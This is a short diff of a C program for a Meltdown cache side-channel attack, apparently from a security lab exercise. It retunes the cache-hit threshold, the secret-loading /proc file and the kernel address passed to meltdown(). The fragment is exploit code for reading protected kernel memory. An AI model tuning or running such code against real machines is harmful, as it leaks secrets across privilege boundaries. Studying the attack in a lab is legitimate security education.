@@ -12,7 +12,7 @@
 #include <x86intrin.h>
 #include "cacheutils.h"
 
-#define CACHE_HIT_THRESHOLD 180
+#define CACHE_HIT_THRESHOLD 150
 #define MARGIN 1024
 
 int array[256*4096];
@@ -135,7 +135,7 @@ int main()
 
   // Registering Signal handler for SIGSEGV
   signal(SIGSEGV, handle_segfault);
-  int fd = open("/proc/secret", O_RDONLY);
+  int fd = open("/proc/secret_data", O_RDONLY);
 
   if (fd < 0) {
     perror("open");
@@ -159,7 +159,7 @@ int main()
 	fault_code = sigsetjmp(restore_point, 1);
   if (fault_code == 0) 
   {
-    meltdown(0xffffffffc035e000); 
+    meltdown(0xffffffffc034b000); 
   }
   else{
     reload();
